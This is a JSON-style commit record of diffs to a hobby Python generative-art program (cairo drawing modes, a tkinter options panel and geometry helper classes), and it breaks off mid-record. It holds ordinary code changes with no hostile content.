{\n+            'points': (\"Points\", int, 5),\n+            'resolution': (\"Resolution\", int, 10),\n+            'draw_centers': (\"Draw Centers\", bool, False),\n+        }\n+\n+    def __init__(self, *args, **kwargs):\n+        self.points = [\n+            ColorPoint(random(), random(), None)\n+            for _ in range(int(kwargs[\"points\"]))\n+        ]\n+\n+        self.resolution = kwargs[\"resolution\"]\n+        self.draw_centers = kwargs[\"draw_centers\"]\n+\n+    def _get_nearest_point(self, point:Point) -> tuple[ColorPoint, float]:\n+        distances = [\n+            (other_point, point.distance(other_point))\n+            for other_point in self.points\n+            if other_point != point\n+        ]\n+\n+        distances = sorted(distances, key=lambda x: x[1])\n+        return distances[0]\n+\n+    def _rect_colors(self, rect:Rect) -> list[ColorPoint]:\n+        found_colors = set[ColorPoint]()\n+        for corner_point in rect.corner_points():\n+            nearest_point = self._get_nearest_point(corner_point)\n+            found_colors.add(nearest_point[0])\n+\n+        return found_colors\n+\n+    def _draw_rect(self, context:cairo.Context, rect:Rect):\n+        available_colors = self._rect_colors(rect)\n+        color_count = len(available_colors)\n+\n+        if rect.width < self.resolution or rect.height < self.resolution:\n+            context.set_source_rgb(*available_colors.pop().color.to_tuple())\n+            context.rectangle(rect.x, rect.y, rect.width, rect.height)\n+            context.fill()\n+            return\n+\n+        if color_count == 1:\n+            context.set_source_rgb(*available_colors.pop().color.to_tuple())\n+            context.rectangle(rect.x, rect.y, rect.width, rect.height)\n+            context.fill()\n+        elif color_count > 0:\n+            for sub_rect in rect.subdivide():\n+                self._draw_rect(context, sub_rect)\n+        else:\n+            context.set_source_rgb(1, 1, 1)\n+            context.rectangle(rect.x, rect.y, rect.width, rect.height)\n+            context.fill()\n+\n+    def draw(self, context:cairo.Context, color_mode:ColorMode, width:int, height:int) -> None:\n+        # Assign colors and make points absolute\n+        for point in self.points:\n+            point.color = color_mode.get_color(point.x, point.y)\n+            point.x = point.x * width\n+            point.y = point.y * height\n+\n+        start_rect = Rect(0, 0, width, height)\n+        self._draw_rect(context, start_rect)\n+\n+        if self.draw_centers:\n+            for point in self.points:\n+                context.set_source_rgb(0, 0, 0)\n+                context.arc(point.x, point.y, 7, 0, 360)\n+                context.fill()\n+                context.set_source_rgb(*point.color.to_tuple())\n+                context.arc(point.x, point.y, 5, 0, 360)\n+                context.fill()\n\\ No newline at end of file\ndiff --git a\/draw_modes\/splines.py b\/draw_modes\/splines.py\nindex be4a873..5f534b7 100644\n--- a\/draw_modes\/splines.py\n+++ b\/draw_modes\/splines.py\n@@ -28,19 +28,25 @@ def get_option_types(cls) -> dict[str, tuple[str, type, object]]:\n             'max_start_angle': (\"Max Start Angle\", int, 360),\n \n             'chain_count': (\"Chains\", int, 2),\n+\n+            'do_stroke': (\"Stroke\", bool, True),\n+            'do_fill': (\"Fill\", bool, True),\n         }\n \n     def __init__(self, *args, **kwargs):\n-        self.count = int(kwargs[\"count\"])\n-        self.min_length = int(kwargs[\"min_length\"])\n-        self.max_length = int(kwargs[\"max_length\"])\n-        self.min_width = int(kwargs[\"min_width\"])\n-        self.max_width = int(kwargs[\"max_width\"])\n-        self.min_angle = int(kwargs[\"min_angle\"])\n-        self.max_angle = int(kwargs[\"max_angle\"])\n-        self.min_start_angle = int(kwargs[\"min_start_angle\"])\n-        self.max_start_angle = int(kwargs[\"max_start_angle\"])\n-        self.chain_count = int(kwargs[\"chain_count\"])\n+        self.count = kwargs[\"count\"]\n+        self.min_length = kwargs[\"min_length\"]\n+        self.max_length = kwargs[\"max_length\"]\n+        self.min_width = kwargs[\"min_width\"]\n+        self.max_width = kwargs[\"max_width\"]\n+        self.min_angle = kwargs[\"min_angle\"]\n+        self.max_angle = kwargs[\"max_angle\"]\n+        self.min_start_angle = kwargs[\"min_start_angle\"]\n+        self.max_start_angle = kwargs[\"max_start_angle\"]\n+        self.chain_count = kwargs[\"chain_count\"]\n+\n+        self.do_stroke = kwargs[\"do_stroke\"]\n+        self.do_fill = kwargs[\"do_fill\"]\n \n     def draw(self, context:cairo.Context, color_mode:ColorMode, width:int, height:int) -> None:\n         for _ in range(self.count):\n@@ -68,4 +74,8 @@ def draw(self, context:cairo.Context, color_mode:ColorMode, width:int, height:in\n                 y = next_y\n                 angle = angle + math.radians(random.random() * (self.max_angle - self.min_angle) + self.min_angle)\n \n-            context.stroke()\n\\ No newline at end of file\n+            if self.do_stroke:\n+                context.stroke()\n+            if self.do_fill:\n+                context.close_path()\n+                context.fill()\n\\ No newline at end of file\ndiff --git a\/draw_modes\/squares.py b\/draw_modes\/squares.py\nindex dbc537d..959bda2 100644\n--- a\/draw_modes\/squares.py\n+++ b\/draw_modes\/squares.py\n@@ -1,3 +1,4 @@\n+from math import ceil, floor\n import cairo\n \n from color_modes import ColorMode\n@@ -26,5 +27,5 @@ def draw(self, context:cairo.Context, color_mode:ColorMode, width:int, height:in\n                 color = color_mode.get_color(count_x\/self.count, count_y\/self.count)\n \n                 context.set_source_rgb(color.r, color.g, color.b)\n-                context.rectangle(count_x * x_step, count_y * y_step, x_step, y_step)\n+                context.rectangle(floor(count_x * x_step), floor(count_y * y_step), ceil(x_step), ceil(y_step))\n                 context.fill()\n\\ No newline at end of file\ndiff --git a\/gui.py b\/gui.py\nindex c77bcd0..c661f3b 100644\n--- a\/gui.py\n+++ b\/gui.py\n@@ -24,7 +24,8 @@\n \n from draw_modes import DrawMode\n from draw_modes.circles import CirclesDrawMode\n-from draw_modes.cluster import ClusterDrawMode\n+from draw_modes.cluster2 import Cluster2DrawMode\n+from draw_modes.cluster3 import Cluster3DrawMode\n from draw_modes.lines import LinesDrawMode\n from draw_modes.overlapping_circles import OverlappingCirclesDrawMode\n from draw_modes.splines import SpinesDrawMode\n@@ -75,7 +76,8 @@ def __init__(self, *args, **kwargs):\n         tkinter.Label(self, text=\"Draw Mode:\").grid(column=0, row=4)\n         self.draw_modes = {\n             x.get_name(): x for x in list[type[DrawMode]]([\n-                ClusterDrawMode,\n+                Cluster3DrawMode,\n+                Cluster2DrawMode,\n                 TrianglesDrawMode,\n                 CirclesDrawMode,\n                 SquaresDrawMode,\n@@ -97,7 +99,7 @@ def __init__(self, *args, **kwargs):\n         # Row 6\n         self.draw_mode_options_frame = tkinter.Frame(self)\n         self.draw_mode_options_frame.grid(column=0, row=6, columnspan=2)\n-        self.draw_mode_settings_entry = {}\n+        self.draw_mode_settings_values = dict[str, tkinter.Variable]()\n \n         # Finalize\n         self._color_mode_changed()\n@@ -139,17 +141,28 @@ def _draw_mode_changed(self, *args, **kwargs) -> None:\n             child.destroy()\n \n         mode = self.draw_modes[self.get_draw_mode()]\n-        self.draw_mode_settings_entry = {}\n+        self.draw_mode_settings_values = dict[str, tkinter.Variable]()\n \n         count = 0\n         for (key, (name, type, default_value)) in mode.get_option_types().items():\n             label = tkinter.Label(self.draw_mode_options_frame, text=name)\n             label.grid(row=count, column=0)\n-            entry = tkinter.Entry(self.draw_mode_options_frame)\n+\n+            if type == bool:\n+                value = tkinter.BooleanVar(value=default_value)\n+                entry = tkinter.Checkbutton(self.draw_mode_options_frame, onvalue=True, offvalue=False, variable=value)\n+            elif type == float:\n+                value = tkinter.DoubleVar\n+                entry = tkinter.Entry(self.draw_mode_options_frame, textvariable=value)\n+            elif type == int:\n+                value = tkinter.IntVar(value=default_value)\n+                entry = tkinter.Entry(self.draw_mode_options_frame, textvariable=value)\n+            else:\n+                value = tkinter.StringVar(value=default_value)\n+                entry = tkinter.Entry(self.draw_mode_options_frame, textvariable=value)\n             entry.grid(row=count, column=1)\n-            entry.insert(tkinter.END, default_value)\n \n-            self.draw_mode_settings_entry[key] = entry\n+            self.draw_mode_settings_values[key] = value\n             count = count + 1\n \n     def get_color_mode_settings(self):\n@@ -163,7 +176,7 @@ def get_draw_mode_settings(self):\n         return {\n             key: entry.get()\n             for (key, entry) in\n-            self.draw_mode_settings_entry.items()\n+            self.draw_mode_settings_values.items()\n         }\n \n class DrawUI(tkinter.Tk):\ndiff --git a\/models\/__init__.py b\/models\/__init__.py\nindex 09a6803..6b69c8a 100644\n--- a\/models\/__init__.py\n+++ b\/models\/__init__.py\n@@ -1,5 +1,8 @@\n from __future__ import annotations\n \n+from math import atan2, dist\n+from turtle import width\n+\n class DrawModes():\n     random = \"random\"\n     bucketed = \"bucketed\"\n@@ -15,6 +18,9 @@ def to_hex(self):\n         hex(int(self.g * 255))\n         return \"#{:02x}{:02x}{:02x}\".format(int(self.r * 255), int(self.g * 255), int(self.b * 255)).upper()\n \n+    def to_tuple(self) -> tuple[float, float, float]:\n+        return (self.r, self.g, self.b)\n+\n     def __add__(self, other:FloatColor):\n         return FloatColor(\n             self.r + other.r,\n@@ -48,3 +54,97 @@ def from_hex(cls, input:str) -> FloatColor:\n         input = input.strip().strip('#')\n         parts = tuple(int(input[i:i+2], 16) for i in (0, 2, 4))\n         return FloatColor(parts[0]\/255, parts[1]\/255, parts[2]\/255)\n+\n+class Point(object):\n+    def __init__(self, x:float, y:float):\n+        self.x = x\n+        self.y = y\n+\n+    def distance(self, other:Point) -> float:\n+        return dist((self.x, self.y), (other.x, other.y))\n+\n+    def get_angle(self, other:Point):\n+        shifted_point = other - self\n+        return atan2(shifted_point.y, shifted_point.x)\n+\n+    @classmethod\n+    def get_circumcenter(cls, a:Point, b:Point, c:Point) -> Point:\n+        d = 2 * (a.x * (b.y - c.y) + b.x * (c.y - a.y) + c.x * (a.y - b.y))\n+        ux = ((a.x * a.x + a.y * a.y) * (b.y - c.y) + (b.x * b.x + b.y * b.y) * (c.y - a.y) + (c.x * c.x + c.y * c.y) * (a.y - b.y)) \/ d\n+        uy = ((a.x * a.x + a.y * a.y) * (c.x - b.x) + (b.x * b.x + b.y * b.y) * (a.x - c.x) + (c.x * c.x + c.y * c.y) * (b.x - a.x)) \/ d\n+        return Point(ux, uy)\n+\n+    @classmethod\n+    def get_midpoint(cls, *points:Point) -> Point:\n+        return Point(\n+            (sum([p.x for p in points])) \/ (len(points)),\n+            (sum([p.y for p in points])) \/ (len(points)),\n+        )\n+\n+    def __eq__(self, other:Point) -> bool:\n+        if other is not Point:\n+            return False\n+        return self.x == other.x and self.y == other.y\n+\n+    def __hash__(self) -> int:\n+        return self.x + self.y\n+\n+    def __add__(self, other:Point) -> Point:\n+        return Point(\n+            self.x + other.x,\n+            self.y + other.y\n+        )\n+\n+    def __sub__(self, other:Point) -> Point:\n+        return Point(\n+            self.x - other.x,\n+            self.y - other.y\n+        )\n+\n+    def __mul__(self, other:Point) -> Point:\n+        return Point(\n+            self.x * other.x,\n+            self.y * other.y\n+        )\n+\n+    def __div__(self, other:Point) -> Point:\n+        return Point(\n+            self.x \/ other.x,\n+            self.y \/ other.y\n+        )\n+\n+class Rect(object):\n+    def __init__(self, x:float, y:float, width:float, height:float):\n+        self.x = x\n+        self.y = y\n+        self.width = width\n+        self.height = height\n+\n+    def contains(self, point:Point) -> bool:\n+        delta_x = point.x - self.x\n+        delta_y = point.y - self.y\n+        return delta_x > 0 and delta_x < self.width and delta_y > 0 and delta_y < self.height\n+\n+    def corner_points(self) -> list[Point]:\n+        return [\n+            Point(self.x, self.y),\n+            Point(self.x + self.width, self.y),\n+            Point(self.x + self.width, self.y + self.height),\n+            Point(self.x, self.y + self.height),\n+        ]\n+\n+    def subdivide(self) -> list[Rect]:\n+        return [\n+            Rect(self.x, self.y, self.width\/2, self.height\/2),\n+            Rect(self.x + self.width\/2, self.y, self.width\/2, self.height\/2),\n+            Rect(self.x + self.width\/2, self.y + self.height\/2, self.width\/2, self.height\/2),\n+            Rect(self.x, self.y + self.height\/2, self.width\/2, self.height\/2),\n+        ]\n+\n+class ColorPoint(Point):\n+    def __init__(self, x:float, y:float, color:FloatColor):\n+        super().__init__(x, y)\n+        self.color:FloatColor = color\n+\n+    def __hash__(self) -> int:\n+        return self.color.to_hex().__hash__()\n","files":{"\/draw_modes\/cluster.py":{"changes":[{"diff":"\n-from math import sqrt\n-\n-from random import choice, random\n-\n-import cairo\n-\n-from color_modes import ColorMode\n-from draw_modes import DrawMode\n-from models import FloatColor\n-\n-class ClusterDrawMode(DrawMode):\n-    @classmethod\n-    def get_name(cls):\n-        return \"Cluster\"\n-\n-    @classmethod\n-    def get_option_types(cls) -> dict[str, tuple[str, type, object]]:\n-        return {\n-            'points': (\"Points\", int, 5),\n-        }\n-\n-    def __init__(self, *args, **kwargs):\n-        self.points = [\n-            (random(), random())\n-            for _ in range(int(kwargs[\"points\"]))\n-        ]\n-\n-    def draw(self, context:cairo.Context, color_mode:ColorMode, width:int, height:int) -> None:\n-\n-        points = [\n-            {\n-                'point': point,\n-                'color': color_mode.get_color(*point),\n-            }\n-            for point in self.points\n-        ]\n-\n-        for pixel_x in range(width):\n-            for pixel_y in range(height):\n-\n-                color = self.get_nearest_point(pixel_x\/width, pixel_y\/height, points)\n-\n-                context.set_source_rgb(color.r, color.g, color.b)\n-                context.rectangle(pixel_x, pixel_y, 1, 1)\n-                context.fill()\n-\n-    @classmethod\n-    def get_nearest_point(cls, x:float, y:float, points:list[dict]) -> FloatColor:\n-        distances = [\n-            {\n-                'distance': cls._get_distance((x, y), (point_pair['point'])),\n-                'color': point_pair['color']\n-            }\n-            for point_pair in points\n-        ]\n-\n-        distances = sorted(distances, key=lambda x: x['distance'])\n-\n-        return distances[0]['color']\n-\n-    @classmethod\n-    def _get_distance(cls, point_a:tuple[float, float], point_b:tuple[float, float]) -> float:\n-        return sqrt(pow(point_a[0] - point_b[0], 2) + pow(point_a[1] - point_b[1], 2))\n\\ No newline at end of file","add":0,"remove":63,"filename":"\/draw_modes\/cluster.py","badparts":["from math import sqrt","from random import choice, random","import cairo","from color_modes import ColorMode","from draw_modes import DrawMode","from models import FloatColor","class ClusterDrawMode(DrawMode):","    @classmethod","    def get_name(cls):","        return \"Cluster\"","    @classmethod","    def get_option_types(cls) -> dict[str, tuple[str, type, object]]:","        return {","            'points': (\"Points\", int, 5),","        }","    def __init__(self, *args, **kwargs):","        self.points = [","            (random(), random())","            for _ in range(int(kwargs[\"points\"]))","        ]","    def draw(self, context:cairo.Context, color_mode:ColorMode, width:int, height:int) -> None:","        points = [","            {","                'point': point,","                'color': color_mode.get_color(*point),","            }","            for point in self.points","        ]","        for pixel_x in range(width):","            for pixel_y in range(height):","                color = self.get_nearest_point(pixel_x\/width, pixel_y\/height, points)","                context.set_source_rgb(color.r, color.g, color.b)","                context.rectangle(pixel_x, pixel_y, 1, 1)","                context.fill()","    @classmethod","    def get_nearest_point(cls, x:float, y:float, points:list[dict]) -> FloatColor:","        distances = [","            {","                'distance': cls._get_distance((x, y), (point_pair['point'])),","                'color': point_pair['color']","            }","            for point_pair in points","        ]","        distances = sorted(distances, key=lambda x: x['distance'])","        return distances[0]['color']","    @classmethod","    def _get_distance(cls, point_a:tuple[float, float], point_b:tuple[float, float]) -> float:","        return sqrt(pow(point_a[0] - point_b[0], 2) + pow(point_a[1] - point_b[1], 2))"],"goodparts":[]}],"source":"\nfrom math import sqrt from random import choice, random import cairo from color_modes import ColorMode from draw_modes import DrawMode from models import FloatColor class ClusterDrawMode(DrawMode): @classmethod def get_name(cls): return \"Cluster\" @classmethod def get_option_types(cls) -> dict[str, tuple[str, type, object]]: return{ 'points':(\"Points\", int, 5), } def __init__(self, *args, **kwargs): self.points=[ (random(), random()) for _ in range(int(kwargs[\"points\"])) ] def draw(self, context:cairo.Context, color_mode:ColorMode, width:int, height:int) -> None: points=[ { 'point': point, 'color': color_mode.get_color(*point), } for point in self.points ] for pixel_x in range(width): for pixel_y in range(height): color=self.get_nearest_point(pixel_x\/width, pixel_y\/height, points) context.set_source_rgb(color.r, color.g, color.b) context.rectangle(pixel_x, pixel_y, 1, 1) context.fill() @classmethod def get_nearest_point(cls, x:float, y:float, points:list[dict]) -> FloatColor: distances=[ { 'distance': cls._get_distance((x, y),(point_pair['point'])), 'color': point_pair['color'] } for point_pair in points ] distances=sorted(distances, key=lambda x: x['distance']) return distances[0]['color'] @classmethod def _get_distance(cls, point_a:tuple[float, float], point_b:tuple[float, float]) -> float: return sqrt(pow(point_a[0] -point_b[0], 2) +pow(point_a[1] -point_b[1], 2)) ","sourceWithComments":"from math import sqrt\n\nfrom random import choice, random\n\nimport cairo\n\nfrom color_modes import ColorMode\nfrom draw_modes import DrawMode\nfrom models import FloatColor\n\nclass ClusterDrawMode(DrawMode):\n    @classmethod\n    def get_name(cls):\n        return \"Cluster\"\n\n    @classmethod\n    def get_option_types(cls) -> dict[str, tuple[str, type, object]]:\n        return {\n            'points': (\"Points\", int, 5),\n        }\n\n    def __init__(self, *args, **kwargs):\n        self.points = [\n            (random(), random())\n            for _ in range(int(kwargs[\"points\"]))\n        ]\n\n    def draw(self, context:cairo.Context, color_mode:ColorMode, width:int, height:int) -> None:\n\n        points = [\n            {\n                'point': point,\n                'color': color_mode.get_color(*point),\n            }\n            for point in self.points\n        ]\n\n        for pixel_x in range(width):\n            for pixel_y in range(height):\n\n                color = self.get_nearest_point(pixel_x\/width, pixel_y\/height, points)\n\n                context.set_source_rgb(color.r, color.g, color.b)\n                context.rectangle(pixel_x, pixel_y, 1, 1)\n                context.fill()\n\n    @classmethod\n    def get_nearest_point(cls, x:float, y:float, points:list[dict]) -> FloatColor:\n        distances = [\n            {\n                'distance': cls._get_distance((x, y), (point_pair['point'])),\n                'color': point_pair['color']\n            }\n            for point_pair in points\n        ]\n\n        distances = sorted(distances, key=lambda x: x['distance'])\n\n        return distances[0]['color']\n\n    @classmethod\n    def _get_distance(cls, point_a:tuple[float, float], point_b:tuple[float, float]) -> float:\n        return sqrt(pow(point_a[0] - point_b[0], 2) + pow(point_a[1] - point_b[1], 2))"},"\/draw_modes\/splines.py":{"changes":[{"diff":"\n             'max_start_angle': (\"Max Start Angle\", int, 360),\n \n             'chain_count': (\"Chains\", int, 2),\n+\n+            'do_stroke': (\"Stroke\", bool, True),\n+            'do_fill': (\"Fill\", bool, True),\n         }\n \n     def __init__(self, *args, **kwargs):\n-        self.count = int(kwargs[\"count\"])\n-        self.min_length = int(kwargs[\"min_length\"])\n-        self.max_length = int(kwargs[\"max_length\"])\n-        self.min_width = int(kwargs[\"min_width\"])\n-        self.max_width = int(kwargs[\"max_width\"])\n-        self.min_angle = int(kwargs[\"min_angle\"])\n-        self.max_angle = int(kwargs[\"max_angle\"])\n-        self.min_start_angle = int(kwargs[\"min_start_angle\"])\n-        self.max_start_angle = int(kwargs[\"max_start_angle\"])\n-        self.chain_count = int(kwargs[\"chain_count\"])\n+        self.count = kwargs[\"count\"]\n+        self.min_length = kwargs[\"min_length\"]\n+        self.max_length = kwargs[\"max_length\"]\n+        self.min_width = kwargs[\"min_width\"]\n+        self.max_width = kwargs[\"max_width\"]\n+        self.min_angle = kwargs[\"min_angle\"]\n+        self.max_angle = kwargs[\"max_angle\"]\n+        self.min_start_angle = kwargs[\"min_start_angle\"]\n+        self.max_start_angle = kwargs[\"max_start_angle\"]\n+        self.chain_count = kwargs[\"chain_count\"]\n+\n+        self.do_stroke = kwargs[\"do_stroke\"]\n+        self.do_fill = kwargs[\"do_fill\"]\n \n     def draw(self, context:cairo.Context, color_mode:ColorMode, width:int, height:int) -> None:\n         for _ in range(self.count):\n","add":16,"remove":10,"filename":"\/draw_modes\/splines.py","badparts":["        self.count = int(kwargs[\"count\"])","        self.min_length = int(kwargs[\"min_length\"])","        self.max_length = int(kwargs[\"max_length\"])","        self.min_width = int(kwargs[\"min_width\"])","        self.max_width = int(kwargs[\"max_width\"])","        self.min_angle = int(kwargs[\"min_angle\"])","        self.max_angle = int(kwargs[\"max_angle\"])","        self.min_start_angle = int(kwargs[\"min_start_angle\"])","        self.max_start_angle = int(kwargs[\"max_start_angle\"])","        self.chain_count = int(kwargs[\"chain_count\"])"],"goodparts":["            'do_stroke': (\"Stroke\", bool, True),","            'do_fill': (\"Fill\", bool, True),","        self.count = kwargs[\"count\"]","        self.min_length = kwargs[\"min_length\"]","        self.max_length = kwargs[\"max_length\"]","        self.min_width = kwargs[\"min_width\"]","        self.max_width = kwargs[\"max_width\"]","        self.min_angle = kwargs[\"min_angle\"]","        self.max_angle = kwargs[\"max_angle\"]","        self.min_start_angle = kwargs[\"min_start_angle\"]","        self.max_start_angle = kwargs[\"max_start_angle\"]","        self.chain_count = kwargs[\"chain_count\"]","        self.do_stroke = kwargs[\"do_stroke\"]","        self.do_fill = kwargs[\"do_fill\"]"]},{"diff":"\n                 y = next_y\n                 angle = angle + math.radians(random.random() * (self.max_angle - self.min_angle) + self.min_angle)\n \n-            context.stroke()\n\\ No newline at end of file\n+            if self.do_stroke:\n+                context.stroke()\n+            if self.do_fill:\n+                context.close_path()\n+                context.fill()\n\\ No newline at end of f","add":5,"remove":1,"filename":"\/draw_modes\/splines.py","badparts":["            context.stroke()"],"goodparts":["            if self.do_stroke:","                context.stroke()","            if self.do_fill:","                context.close_path()","                context.fill()"]}],"source":"\nimport math import random import cairo from color_modes import ColorMode from draw_modes import DrawMode class SpinesDrawMode(DrawMode): @classmethod def get_name(cls): return \"Splines\" @classmethod def get_option_types(cls) -> dict[str, tuple[str, type, object]]: return{ 'count':(\"Count\", int, 500), 'min_length':(\"Min Length\", int, 0), 'max_length':(\"Max Length\", int, 50), 'min_width':(\"Min Width\", int, 5), 'max_width':(\"Max Width\", int, 5), 'min_angle':(\"Min Angle\", int, -30), 'max_angle':(\"Max Angle\", int, 30), 'min_start_angle':(\"Min Start Angle\", int, 0), 'max_start_angle':(\"Max Start Angle\", int, 360), 'chain_count':(\"Chains\", int, 2), } def __init__(self, *args, **kwargs): self.count=int(kwargs[\"count\"]) self.min_length=int(kwargs[\"min_length\"]) self.max_length=int(kwargs[\"max_length\"]) self.min_width=int(kwargs[\"min_width\"]) self.max_width=int(kwargs[\"max_width\"]) self.min_angle=int(kwargs[\"min_angle\"]) self.max_angle=int(kwargs[\"max_angle\"]) self.min_start_angle=int(kwargs[\"min_start_angle\"]) self.max_start_angle=int(kwargs[\"max_start_angle\"]) self.chain_count=int(kwargs[\"chain_count\"]) def draw(self, context:cairo.Context, color_mode:ColorMode, width:int, height:int) -> None: for _ in range(self.count): x=random.randint(0, width) y=random.randint(0, height) context.move_to(x, y) length=random.random() *(self.max_length -self.min_length) +self.min_length angle=math.radians(random.random() *(self.max_start_angle -self.min_start_angle) +self.min_start_angle) for _ in range(self.chain_count +1): color=color_mode.get_color(x\/width, y\/height) context.set_source_rgb(color.r, color.g, color.b) line_width=random.random() *(self.max_width -self.min_width) +self.min_width context.set_line_width(line_width) next_x=x +math.cos(angle) * length next_y=y +math.sin(angle) * length context.line_to(next_x, next_y) x=next_x y=next_y angle=angle +math.radians(random.random() *(self.max_angle -self.min_angle) +self.min_angle) context.stroke() ","sourceWithComments":"import math\nimport random\nimport cairo\n\nfrom color_modes import ColorMode\nfrom draw_modes import DrawMode\n\nclass SpinesDrawMode(DrawMode):\n    @classmethod\n    def get_name(cls):\n        return \"Splines\"\n\n    @classmethod\n    def get_option_types(cls) -> dict[str, tuple[str, type, object]]:\n        return {\n            'count': (\"Count\", int, 500),\n\n            'min_length': (\"Min Length\", int, 0),\n            'max_length': (\"Max Length\", int, 50),\n\n            'min_width': (\"Min Width\", int, 5),\n            'max_width': (\"Max Width\", int, 5),\n\n            'min_angle': (\"Min Angle\", int, -30),\n            'max_angle': (\"Max Angle\", int, 30),\n\n            'min_start_angle': (\"Min Start Angle\", int, 0),\n            'max_start_angle': (\"Max Start Angle\", int, 360),\n\n            'chain_count': (\"Chains\", int, 2),\n        }\n\n    def __init__(self, *args, **kwargs):\n        self.count = int(kwargs[\"count\"])\n        self.min_length = int(kwargs[\"min_length\"])\n        self.max_length = int(kwargs[\"max_length\"])\n        self.min_width = int(kwargs[\"min_width\"])\n        self.max_width = int(kwargs[\"max_width\"])\n        self.min_angle = int(kwargs[\"min_angle\"])\n        self.max_angle = int(kwargs[\"max_angle\"])\n        self.min_start_angle = int(kwargs[\"min_start_angle\"])\n        self.max_start_angle = int(kwargs[\"max_start_angle\"])\n        self.chain_count = int(kwargs[\"chain_count\"])\n\n    def draw(self, context:cairo.Context, color_mode:ColorMode, width:int, height:int) -> None:\n        for _ in range(self.count):\n\n            x = random.randint(0, width)\n            y = random.randint(0, height)\n            context.move_to(x, y)\n\n            length = random.random() * (self.max_length - self.min_length) + self.min_length\n            angle = math.radians(random.random() * (self.max_start_angle - self.min_start_angle) + self.min_start_angle)\n\n            for _ in range(self.chain_count + 1):\n                color = color_mode.get_color(x\/width, y\/height)\n                context.set_source_rgb(color.r, color.g, color.b)\n\n                line_width = random.random() * (self.max_width - self.min_width) + self.min_width\n                context.set_line_width(line_width)\n\n                next_x = x + math.cos(angle) * length\n                next_y = y + math.sin(angle) * length\n\n                context.line_to(next_x, next_y)\n\n                x = next_x\n                y = next_y\n                angle = angle + math.radians(random.random() * (self.max_angle - self.min_angle) + self.min_angle)\n\n            context.stroke()"},"\/draw_modes\/squares.py":{"changes":[{"diff":"\n                 color = color_mode.get_color(count_x\/self.count, count_y\/self.count)\n \n                 context.set_source_rgb(color.r, color.g, color.b)\n-                context.rectangle(count_x * x_step, count_y * y_step, x_step, y_step)\n+                context.rectangle(floor(count_x * x_step), floor(count_y * y_step), ceil(x_step), ceil(y_step))\n                 context.fill()\n\\ No newline at end of ","add":1,"remove":1,"filename":"\/draw_modes\/squares.py","badparts":["                context.rectangle(count_x * x_step, count_y * y_step, x_step, y_step)"],"goodparts":["                context.rectangle(floor(count_x * x_step), floor(count_y * y_step), ceil(x_step), ceil(y_step))"]}],"source":"\nimport cairo from color_modes import ColorMode from draw_modes import DrawMode class SquaresDrawMode(DrawMode): @classmethod def get_name(cls): return \"Squares\" @classmethod def get_option_types(cls) -> dict[str, tuple[str, type, object]]: return{ 'count':(\"Count\", int, 50), } def __init__(self, *args, **kwargs): self.count=int(kwargs[\"count\"]) def draw(self, context:cairo.Context, color_mode:ColorMode, width:int, height:int) -> None: x_step=width\/self.count y_step=height\/self.count for count_x in range(self.count): for count_y in range(self.count): color=color_mode.get_color(count_x\/self.count, count_y\/self.count) context.set_source_rgb(color.r, color.g, color.b) context.rectangle(count_x * x_step, count_y * y_step, x_step, y_step) context.fill() ","sourceWithComments":"import cairo\n\nfrom color_modes import ColorMode\nfrom draw_modes import DrawMode\n\nclass SquaresDrawMode(DrawMode):\n    @classmethod\n    def get_name(cls):\n        return \"Squares\"\n\n    @classmethod\n    def get_option_types(cls) -> dict[str, tuple[str, type, object]]:\n        return {\n            'count': (\"Count\", int, 50),\n        }\n\n    def __init__(self, *args, **kwargs):\n        self.count = int(kwargs[\"count\"])\n\n    def draw(self, context:cairo.Context, color_mode:ColorMode, width:int, height:int) -> None:\n        x_step = width\/self.count\n        y_step = height\/self.count\n\n        for count_x in range(self.count):\n            for count_y in range(self.count):\n                color = color_mode.get_color(count_x\/self.count, count_y\/self.count)\n\n                context.set_source_rgb(color.r, color.g, color.b)\n                context.rectangle(count_x * x_step, count_y * y_step, x_step, y_step)\n                context.fill()"},"\/gui.py":{"changes":[{"diff":"\n \n from draw_modes import DrawMode\n from draw_modes.circles import CirclesDrawMode\n-from draw_modes.cluster import ClusterDrawMode\n+from draw_modes.cluster2 import Cluster2DrawMode\n+from draw_modes.cluster3 import Cluster3DrawMode\n from draw_modes.lines import LinesDrawMode\n from draw_modes.overlapping_circles import OverlappingCirclesDrawMode\n from draw_modes.splines import SpinesDrawMode\n","add":2,"remove":1,"filename":"\/gui.py","badparts":["from draw_modes.cluster import ClusterDrawMode"],"goodparts":["from draw_modes.cluster2 import Cluster2DrawMode","from draw_modes.cluster3 import Cluster3DrawMode"]},{"diff":"\n         tkinter.Label(self, text=\"Draw Mode:\").grid(column=0, row=4)\n         self.draw_modes = {\n             x.get_name(): x for x in list[type[DrawMode]]([\n-                ClusterDrawMode,\n+                Cluster3DrawMode,\n+                Cluster2DrawMode,\n                 TrianglesDrawMode,\n                 CirclesDrawMode,\n                 SquaresDrawMode,\n","add":2,"remove":1,"filename":"\/gui.py","badparts":["                ClusterDrawMode,"],"goodparts":["                Cluster3DrawMode,","                Cluster2DrawMode,"]},{"diff":"\n         # Row 6\n         self.draw_mode_options_frame = tkinter.Frame(self)\n         self.draw_mode_options_frame.grid(column=0, row=6, columnspan=2)\n-        self.draw_mode_settings_entry = {}\n+        self.draw_mode_settings_values = dict[str, tkinter.Variable]()\n \n         # Finalize\n         self._color_mode_changed()\n","add":1,"remove":1,"filename":"\/gui.py","badparts":["        self.draw_mode_settings_entry = {}"],"goodparts":["        self.draw_mode_settings_values = dict[str, tkinter.Variable]()"]},{"diff":"\n             child.destroy()\n \n         mode = self.draw_modes[self.get_draw_mode()]\n-        self.draw_mode_settings_entry = {}\n+        self.draw_mode_settings_values = dict[str, tkinter.Variable]()\n \n         count = 0\n         for (key, (name, type, default_value)) in mode.get_option_types().items():\n             label = tkinter.Label(self.draw_mode_options_frame, text=name)\n             label.grid(row=count, column=0)\n-            entry = tkinter.Entry(self.draw_mode_options_frame)\n+\n+            if type == bool:\n+                value = tkinter.BooleanVar(value=default_value)\n+                entry = tkinter.Checkbutton(self.draw_mode_options_frame, onvalue=True, offvalue=False, variable=value)\n+            elif type == float:\n+                value = tkinter.DoubleVar\n+                entry = tkinter.Entry(self.draw_mode_options_frame, textvariable=value)\n+            elif type == int:\n+                value = tkinter.IntVar(value=default_value)\n+                entry = tkinter.Entry(self.draw_mode_options_frame, textvariable=value)\n+            else:\n+                value = tkinter.StringVar(value=default_value)\n+                entry = tkinter.Entry(self.draw_mode_options_frame, textvariable=value)\n             entry.grid(row=count, column=1)\n-            entry.insert(tkinter.END, default_value)\n \n-            self.draw_mode_settings_entry[key] = entry\n+            self.draw_mode_settings_values[key] = value\n             count = count + 1\n \n     def 